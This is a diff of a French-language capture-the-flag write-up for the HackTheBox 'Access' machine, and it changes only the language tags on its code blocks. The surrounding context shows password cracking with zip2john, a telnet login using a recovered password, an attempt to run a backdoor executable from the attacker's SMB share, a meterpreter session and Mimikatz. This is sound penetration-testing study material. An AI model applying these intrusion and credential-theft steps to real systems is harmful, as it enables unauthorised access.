@@ -36,7 +36,7 @@ wget --no-passive-ftp 'ftp://10.10.10.98/Engineer/Access Control.zip'
 
 L'archive zip doit être au format 7z car on obtient un message d'erreur lors de la décompression :  
 
-```shellsession
+```bash
 $ unzip  Access\ Control.zip
 Archive:  Access Control.zip
    skipping: Access Control.pst      unsupported compression method 99
@@ -44,7 +44,7 @@ Archive:  Access Control.zip
 
 Et 7zip réclame lui un password pour désarchiver les fichiers. On peut se servir de l'utilisateur zip2john pour obtenir un hash correspondant au mot de passe de l'archive et tenter de le casser via dictionnaire :  
 
-```shellsession
+```bash
 $ zip2john Access\ Control.zip
 Access Control.zip:$zip2$*0*3*0*6f1cd9ae3480669b2b61dbb4c0fc7ce3*fef9*299a*ZFILE*Access Control.zip*0*4d*9dcc2150285eb46bd46a*$/zip2$:::::Access Control.zip
 ```
@@ -67,7 +67,7 @@ id,username,password,Status,last_login,RoleID,Remark
 
 Le mot de passe *access4u@security* permet de déchiffrer l'archive. J'ai ensuite utilisé l'utilitaire *readpst* pour extraire les mails du PST :  
 
-```shellsession
+```bash
 $ readpst  Access\ Control.pst
 Opening PST file and indexes...
 Processing Folder "Deleted Items"
@@ -105,7 +105,7 @@ John
 
 Le mot de passe nous ouvre les portes du Telnet :  
 
-```shellsession
+```bash
 $ telnet 10.10.10.98
 Trying 10.10.10.98...
 Connected to 10.10.10.98.
@@ -183,7 +183,7 @@ Un *tasklist* nous indique qu'à première vue aucun antivirus ne tourne sur la 
 
 On est toutefois bloqué par une GPO si on tente d'exécuter un exe :  
 
-```shellsession
+```bash
 C:\Users\security>\\10.10.14.177\public\backd.exe
 This program is blocked by group policy. For more information, contact your system administrator.
 ```
@@ -251,7 +251,7 @@ Aucune de ces deux vulnérabilité ne s'avère exploitable... C'est le moment de
 
 J'ai bien trouvé quelques credentials sur le système :  
 
-```shellsession
+```bash
 c:\temp\scripts>type 1_CREATE_SYSDBA.sql
 CREATE LOGIN  WITH PASSWORD='', CHECK_EXPIRATION=OFF, CHECK_POLICY=OFF;CREATE LOGIN sysdba WITH PASSWORD='masterkey', CHECK_EXPIRATION=OFF, CHECK_POLICY=OFF;
 
@@ -282,7 +282,7 @@ For the vbs scripts:
 
 J'ai trouvé un fichier LNK intéressant dans le Deskop de l'utilisateur spécial Public :  
 
-```shellsession
+```bash
 C:\Users\Public\Desktop>dir
  Volume in drive C has no label.
  Volume Serial Number is 9C45-DBF0
@@ -311,7 +311,7 @@ Histoire de faire un peu de code PowerShell j'ai écrit une fonction (voir à la
 
 Ainsi trouver notre LNK en fouillant tous ceux du système peut se faire de cette façon :  
 
-```shellsession
+```bash
 PS C:\temp> get-childitem -path c:/ -filter "*.lnk" -recurse -force -erroraction silentlycontinue | Parse-LnkFile | where {$_.Arguments -like "*savecred*"}
 
 Lnk File    : C:\Users\Public\Desktop\ZKAccess3.5 Security System.lnk
@@ -368,7 +368,7 @@ meterpreter > cat root.txt
 
 Pour le plaisir et comme aucun AV n'est présent on peut uploader et lancer un petit *Mimikatz* :  
 
-```shellsession
+```bash
 c:\users\administrator\downloads>mimikatz.exe
 mimikatz.exe
 
